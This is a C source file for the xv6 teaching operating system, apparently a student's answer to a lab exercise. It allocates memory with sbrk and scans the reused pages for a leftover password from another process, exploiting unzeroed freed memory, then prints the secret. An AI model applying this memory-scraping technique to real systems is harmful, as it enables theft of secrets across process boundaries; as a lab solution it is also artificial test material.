#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  const char *pattern = "my very very very secret pw is:   ";
  int pattern_offset = 8; // Start matching after the first 8 bytes because the first 8 bytes are
                          // occupied by the freelist ptr.
  int pattern_len = 24;   // Length of the pattern to match (after the first 8 bytes).
  int secret_len = 8;     // Length of the secret to extract.
  int pages = 32;         // Number of pages to allocate (adjust as needed, 32 is enough).

  char *end = sbrk(PGSIZE * pages);
  if (end == (char *)-1) {
    printf("attack: sbrk failed\n");
    exit(1);
  }

  for (char *ptr = end; ptr < end + PGSIZE * pages; ptr += PGSIZE) {
    // Use memcmp to check if the current position matches the pattern.
    if (memcmp(ptr + pattern_offset, pattern + pattern_offset, pattern_len) == 0) {
      // Found the pattern, the secret is right after it.
      char *secret_addr = ptr + pattern_len + pattern_offset;
      write(2, secret_addr, secret_len);
      exit(0);
    }
  }

  // If the loop finishes without finding the secret.
  printf("attack: secret not found\n");
  exit(1);
}
